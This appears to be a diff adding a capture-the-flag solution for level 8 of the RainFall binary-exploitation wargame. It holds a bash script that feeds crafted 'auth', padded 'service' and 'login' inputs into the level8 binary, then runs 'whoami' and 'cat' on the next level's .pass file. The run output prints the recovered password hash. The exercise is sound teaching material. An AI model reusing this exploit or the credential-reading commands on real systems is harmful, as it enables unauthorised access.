@@ -1,0 +1,20 @@
+; -----------------------------------------------------------------------
+
+#!/bin/bash
+python -c "print('auth ')"
+python -c "print('service ' + 'S'*100)"
+python -c "print('login')"
+python -c "print('whoami')"
+python -c "print('cat /home/user/level9/.pass')"
+
+; -----------------------------------------------------------------------
+
+level8@RainFall:/tmp$ ./lev8.sh | /home/user/level8/level8
+(nil), (nil) 
+0x804a008, (nil) 
+0x804a008, 0x804a018 
+level9
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+0x804a008, 0x804a018 
+
+; -----------------------------------------------------------------------
